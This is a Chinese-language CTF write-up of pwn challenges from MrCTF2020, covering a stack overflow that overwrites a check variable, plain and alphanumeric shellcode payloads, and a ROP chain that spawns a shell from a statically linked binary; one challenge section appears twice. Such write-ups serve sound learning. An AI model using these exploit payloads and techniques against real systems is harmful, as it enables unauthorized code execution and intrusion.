# 前言

天璇战队(merak)办的新生赛，邀请Nepnep去玩儿~ 我跟着凑个热闹~

pwn都不难，除了有道算法题不会（最后队内一个大佬解出来了...）貌似最后还冲到了榜首...

![](http://image.taqini.space/img/20200331225748.png)

我队大佬们tql，为你们点赞！

![](http://image.taqini.space/img/nepnep.jpg)

# Pwn

和WUST-CTF几乎同时举办的~ 所以就只做了pwn~(其他的题队内大佬都秒了)

## easy_overflow
- 题目描述：
  
    > 有种你连我
- 题目附件：[easy_overflow](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MrCTF2020/pwn/easy_overflow/easy_overflow)
- 考察点：栈溢出、变量覆盖
- 难度：入门
- 初始分值：500
- 最终分值：50
- 完成人数：58

### 程序分析

主要代码如下，`gets`函数存在漏洞，可导致栈溢出：

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  char v4; // [rsp+0h] [rbp-70h]
  char v5; // [rsp+30h] [rbp-40h]
  // ...
  gets(&v4, argv);
  if ( !check(&v5) )
    exit(0);
  system("/bin/sh");
  return 0;
}
```

程序逻辑比较简单：对`v5`进行检查，通过检查就给shell。

```nasm
 ► 0x555555554874 <main+113>    call   check <0x55555555479a>
        rdi: 0x7fffffffda80 ◂— 'ju3t_@_f@k3_f1@g'
```

> `v5="ju3t_@_f@k3_f1@g"`

`check`函数如下：

```c
signed __int64 __fastcall check(__int64 a1){
  int i; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  v3 = strlen(fake_flag);
  for ( i = 0; ; ++i )
  {
    if ( i == v3 )
      return 1LL;
    if ( *(i + a1) != fake_flag[i] )
      break;
  }
  return 0LL;
}
```

> 其中`fake_flag`位于`.data`段， `fake_flag = "n0t_r3@11y_f1@g"`

### 解题思路

`gets(&v4)`存在溢出，将`v4`后的`v5`覆盖为`n0t_r3@11y_f1@g`即可通过`check`

### exp
```python
offset = 48
payload = 'A'*offset
payload += 'n0t_r3@11y_f1@g'
sl(payload)
```



## shellcode
- 题目描述：
  
    > zaima, 有人想试试你的shell麦吉克
- 题目附件：[shellcode](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MrCTF2020/pwn/shellcode/shellcode)
- 考察点：shellcode
- 难度：入门
- 初始分值：500
- 最终分值：120
- 完成人数：47

### 程序分析
没啥好分析的，输入shellcode即可。

### exp
```python
payload = asm(shellcraft.sh())
sl(payload)
```



## shellcode-revenge
- 题目描述：
  
> 你的麦基客似乎没用了

- 题目附件：[shellcode-revenge](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MrCTF2020/pwn/shellcode-revenge/shellcode-revenge)
- 考察点：aplha shellcode
- 难度：简单
- 初始分值：500
- 最终分值：448
- 完成人数：18

### 程序分析

> IDA没有识别出来`call rax`，所以直接F5会失败。用ghidra就没问题~

```c
undefined8 main(void){
  ssize_t sVar1;
  undefined buf [1032];
  int len;
  int i;
  
  write(1,"Show me your magic!\n",0x14);
  sVar1 = read(0,buf,0x400);
  len = (int)sVar1;
  if (0 < len) {
    i = 0;
    while (i < len) {
      if (((((char)buf[i] < 'a') || ('z' < (char)buf[i])) &&
          (((char)buf[i] < 'A' || ('Z' < (char)buf[i])))) &&
         (((char)buf[i] < '0' || ('Z' < (char)buf[i])))) {
        printf("I Can\'t Read This!");
        return 0;
      }
      i = i + 1;
    }
    (*(code *)buf)();
  }
  return 0;
}
```

对输入进行了限制，基本上只能使用可见字符做shellcode.

### 解题思路

直接用`alpha3`生成`shellcode`即可。

有关纯字符shellcode的介绍可以看我的这篇文章：[纯字符shellcode生成指南](http://taqini.space/2020/03/31/alpha-shellcode-gen/#x86-alpha%E7%BC%96%E7%A0%81)

### exp

```python
payload = 'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'
se(payload)
```



## easy_overflow
- 题目描述：
  
    > 有种你连我
- 题目附件：[easy_overflow](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MrCTF2020/pwn/easy_overflow/easy_overflow)
- 考察点：栈溢出、变量覆盖
- 难度：入门
- 初始分值：500
- 最终分值：50
- 完成人数：58

### 程序分析

主要代码如下，`gets`函数存在漏洞，可导致栈溢出：

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  char v4; // [rsp+0h] [rbp-70h]
  char v5; // [rsp+30h] [rbp-40h]
  // ...
  gets(&v4, argv);
  if ( !check(&v5) )
    exit(0);
  system("/bin/sh");
  return 0;
}
```

程序逻辑比较简单：对`v5`进行检查，通过检查就给shell。

```nasm
 ► 0x555555554874 <main+113>    call   check <0x55555555479a>
        rdi: 0x7fffffffda80 ◂— 'ju3t_@_f@k3_f1@g'
```

> `v5="ju3t_@_f@k3_f1@g"`

`check`函数如下：

```c
signed __int64 __fastcall check(__int64 a1){
  int i; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  v3 = strlen(fake_flag);
  for ( i = 0; ; ++i )
  {
    if ( i == v3 )
      return 1LL;
    if ( *(i + a1) != fake_flag[i] )
      break;
  }
  return 0LL;
}
```

> 其中`fake_flag`位于`.data`段， `fake_flag = "n0t_r3@11y_f1@g"`

### 解题思路

`gets(&v4)`存在溢出，将`v4`后的`v5`覆盖为`n0t_r3@11y_f1@g`即可通过`check`

### exp
```python
offset = 48
payload = 'A'*offset
payload += 'n0t_r3@11y_f1@g'
sl(payload)
```



## nothing_but_everythin
- 题目描述：
  
    > What could you do with such a pile of rubbish?
- 题目附件：[nothing_but_everythin](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MrCTF2020/pwn/nothing_but_everythin/nothing_but_everythin)
- 考察点：栈溢出、静态编译
- 难度：简单
- 初始分值：500
- 最终分值：465
- 完成人数：15

### 程序分析

第两次`read`存在栈溢出：

```c
undefined8 main(void){
  undefined local_78 [112];
  
  FUN_00411f60(PTR_DAT_006b97a8,0);
  FUN_00411f60(PTR_DAT_006b97a0,0);
  read(0,&DAT_006bc3a0,0x14);
  read(0,local_78,0x300);
  puts(local_78);
  return 0;
}
```

### 解题思路
直接找gadget，构造rop链：

```python
def ropchain():
    from struct import pack
    # Padding goes here
    p = ''
    p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
    p += pack('<Q', 0x00000000006BC3A0) # data /bin/sh
    p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
    p += pack('<Q', 0x0000000000000000) # data 0
    p += pack('<Q', 0x0000000000449505) # pop rdx ; ret
    p += pack('<Q', 0x0000000000000000) # data 0
    p += pack('<Q', 0x00000000004494ac) # pop rax ; ret
    p += pack('<Q', 0x000000000000003b) # date 0x3b
    p += pack('<Q', 0x000000000040123c) # syscall
    return p
```

> 其中`"/bin/sh\0"`可以利用第一次`read`读入

### exp

```python
# rop1
offset = 15
payload = p64(0x0)*offset
payload += ropchain()

sl('/bin/sh\0')
#debug()
sl(payload)

p.interactive()
```

### More

这题可以`ROPgadget`一把梭，刚开始远程打不了，以为是一把梭脚本有问题，后来群里说是题目的问题。。。。修好了之后又试了一下一把梭，可以打：

```bash
ROPgadget --binary ./nothing_but_everythin --ropchain
```

> 静态编译的程序中存在大量gadget，因此可以直接用ROPgadget生成rop链